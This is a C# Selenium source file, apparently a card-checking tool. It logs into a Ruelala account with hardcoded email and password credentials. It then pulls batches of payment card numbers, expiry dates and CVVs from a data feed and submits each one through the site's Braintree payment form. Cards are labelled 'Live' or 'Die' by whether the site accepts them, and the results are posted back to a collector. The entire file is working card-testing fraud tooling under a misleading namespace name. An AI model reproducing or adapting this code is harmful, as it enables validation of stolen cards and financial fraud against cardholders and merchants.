using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Support.UI;
using System.Threading.Tasks;
using System.IO;
using Newtonsoft.Json.Linq;

namespace BetBasketBallChecker
{
    class CompareRuelala : CompareClass
    {
        public CompareRuelala(Form1 wnd): base(wnd)
        {
            m_userName = "amroqww@gmail.com";
            m_password = "Asdasd123@";
            load = new WebDriverWait(driver, TimeSpan.FromSeconds(100));
        }
        protected override void login()
        {
            log("error", "Enter Login");
            driver.Navigate().GoToUrl("https://www.ruelala.com/auth/secure_login/?next=/account/");
            load.Until(ExpectedConditions.ElementExists(By.XPath("//input[@id='secure_login_username']")));
            inputTexttoElement("//input[@id='secure_login_username']", m_userName);
            inputTexttoElement("//input[@id='secure_login_password']", m_password);
            var loginBtn = driver.FindElementByXPath("//button[text()='Log In']");
            loginBtn.Click();
            Thread.Sleep(1000);
            try
            {
                load.Until(ExpectedConditions.ElementExists(By.XPath("//div[@class='preset-selection']/div/a[@data-country='US']")));
                loginBtn = driver.FindElementByXPath("//div[@class='preset-selection']/div/a[@data-country='US']");
                try
                {
                   js.ExecuteScript("arguments[0].click()", loginBtn);
                }
                catch (Exception ex)
                { }
            }
            catch (Exception ex)
            {
            }
            clickPaymentBtn();
        }

        protected override int checkOut(String cartUrl, String number, String month, String year, String cvv)
        {
            log("error", "Enter Checkout " + number);
            //load.Until(ExpectedConditions.ElementExists(By.XPath("//input[@id='cardholder_name']")));
            try
            {
                load.Until(ExpectedConditions.ElementExists(By.XPath("//iframe[@id='braintree-hosted-field-number']")));
            }
            catch (Exception ex) { }
            inputTexttoElement("//input[@id='cardholder_name']", "Ahmade " + cvv);
            IList<IWebElement> iframe = driver.FindElements(By.TagName("iframe"));

            load.Until(ExpectedConditions.ElementExists(By.XPath("//iframe[@id='braintree-hosted-field-number']")));

            var iframe1 = driver.FindElement(By.Id("braintree-hosted-field-number"));
                driver.SwitchTo().Frame(iframe1);
            load.Until(ExpectedConditions.ElementExists(By.XPath("//input[@id='credit-card-number']")));
            var element1 = driver.FindElementByXPath("//input[@id='credit-card-number']");
            element1.Clear();
            element1.SendKeys(number);
            driver.SwitchTo().ParentFrame();

            iframe1 = driver.FindElement(By.Id("braintree-hosted-field-expirationMonth"));
                driver.SwitchTo().Frame(iframe1);
            load.Until(ExpectedConditions.ElementExists(By.XPath("//input[@id='expiration-month']")));
            element1 = driver.FindElementByXPath("//input[@id='expiration-month']");
            element1.Clear();
            element1.SendKeys(month);
            driver.SwitchTo().ParentFrame();

            iframe1 = driver.FindElement(By.Id("braintree-hosted-field-expirationYear"));
                driver.SwitchTo().Frame(iframe1);
            load.Until(ExpectedConditions.ElementExists(By.XPath("//input[@id='expiration-year']")));
            element1 = driver.FindElementByXPath("//input[@id='expiration-year']");
            element1.Clear();
            element1.SendKeys("20" + year);
            driver.SwitchTo().ParentFrame();

            iframe1 = driver.FindElement(By.Id("braintree-hosted-field-cvv"));
            driver.SwitchTo().Frame(iframe1);
            load.Until(ExpectedConditions.ElementExists(By.XPath("//input[@id='cvv']")));
            element1 = driver.FindElementByXPath("//input[@id='cvv']");
            element1.Clear();
            element1.SendKeys(cvv);
            driver.SwitchTo().ParentFrame();

            var loginBtn = driver.FindElementByXPath("//div[@class='form-actions']/button[@type='submit' and text()='Add new payment']");
            loginBtn.Click();
            int counter = 0;
            while (true)
            {
                counter++;
                if (counter > 3)
                {
                    element1 = driver.FindElementByXPath("//a[@data-remodal-action='close']");
                    element1.Click();
                    clickPaymentBtn();
                    return (int)CheckResult.Error;
                }

                try
                {
                    load.Until(ExpectedConditions.ElementExists(By.XPath("//div[@id='credit_card_modal']/form[@id='credit_card_form']/ul[@class='form-errors']/li[@class='form-error']")));
                    element1 = driver.FindElementByXPath("//a[@data-remodal-action='close']");
                    element1.Click();
                    clickPaymentBtn();
                    return (int)CheckResult.Error;
                }
                catch (Exception ex)
                {
                    //remove live card
                    /*
                    try
                    {
                        load.Until(ExpectedConditions.ElementExists(By.XPath("//a[@class='remove-payment-link']")));
                        driver.FindElementByXPath("//a[@class='remove-payment-link']").Click();
                        load.Until(ExpectedConditions.ElementExists(By.XPath("//button[@class='rue-button modal-confirm']")));
                        driver.FindElementByXPath("//button[@class='rue-button modal-confirm']").Click();
                    }
                    catch (Exception e1x)
                    { }
                    */
                    try
                    {
                        if (driver.FindElementByXPath("//button[@id='add_payment']").Displayed == true)
                        {
                            clickPaymentBtn();
                            return (int)CheckResult.Success;
                        }
                    }
                    catch (Exception ex4)
                    {
                    }
                }
            }
        }
        protected void clickPaymentBtn()
        {
            try
            {
                load.Until(ExpectedConditions.ElementExists(By.XPath("//button[@id='add_payment']")));
                var loginBtn = driver.FindElementByXPath("//button[@id='add_payment']");
                js.ExecuteScript("arguments[0].scrollIntoView()", loginBtn);
                loginBtn.Click();
            }
            catch (Exception exx)
            { }
        }
        protected int countAddedCard()
        {
            try
            {
                int ret = driver.FindElementsByXPath("//ul[@class='payments-list']/li[@class='payment-info']").Count;
                return ret;
            }
            catch (Exception ex)
            {
                return -1;
            }
            
        }

        protected override void startCompare(String cartUrl,string data)
        {
            while (true)
            {
                try
                {
                    login();
                    break;
                }catch (Exception ex) {
                }

            }
            while (true)
            {
                try
                {
                    m_dataList = m_interface.getDataList(2);
                }
                catch (Exception ex)
                {
                    log("error", "m_interface.getDataList" + ex.Message);
                }
                if (m_dataList.Count < 1)
                {
                    log("error", "Data Length 0");
                    Thread.Sleep(20000);
                    continue;
                }
                List<Dictionary<string, string>> checkresult = new List<Dictionary<string, string>>();
               
                foreach (Dictionary<string, string> item in m_dataList)
                {
                    List<Dictionary<string, string>> temp1 = new List<Dictionary<string, string>>();
                    Dictionary<string, string> temp = new Dictionary<string, string>();
                    int ret = 0;
                    while (true)
                    {
                        try
                        {
                            ret = checkOut(cartUrl, item["number"], item["month"], item["year"], item["cvv"].Substring(0, 3));
                            break;
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                    
                    if (ret == (int)CheckResult.Success)
                    {
                        m_wnd.writeResult(String.Format("{0} {1}/{2} {3}: {4}", item["number"], item["month"], item["year"], item["cvv"], "Live"));

                        int cardType = 1;
                        if (getCardType(item["number"]) == (int)CardType.Visa)
                        {
                            log("live", String.Format("{0} {1}/{2} {3}: {4}", item["number"], item["month"], item["year"], item["cvv"], "Live") + " Visa");
                        }
                        else
                        {
                            cardType = 2;
                            log("live", String.Format("{0} {1}/{2} {3}: {4}", item["number"], item["month"], item["year"], item["cvv"], "Live") + " Master");
                        }
                        temp.Add("number", item["number"]);
                        temp.Add("status", "8");
                        temp.Add("cvv", item["cvv"].Substring(0, 3));
                        temp.Add("country", "");
                        temp.Add("family", cardType.ToString());
                        temp1.Add(temp);
                        postResult(temp1);
                    }
                    else
                    {
                        log("error", String.Format("{0} {1}/{2} {3}: {4}", item["number"], item["month"], item["year"], item["cvv"], "Die"));
                        m_wnd.writeResult(String.Format("{0} {1}/{2} {3}: {4}", item["number"], item["month"], item["year"], item["cvv"], "Die"));
                        temp.Add("number", item["number"]);
                        temp.Add("status", "2");
                        temp.Add("country", "");
                        temp.Add("cvv", item["cvv"].Substring(0, 3));
                        temp.Add("family", "0");
                        checkresult.Add(temp);
                    }
                }

                postResult(checkresult);
            }
        }
    }
}
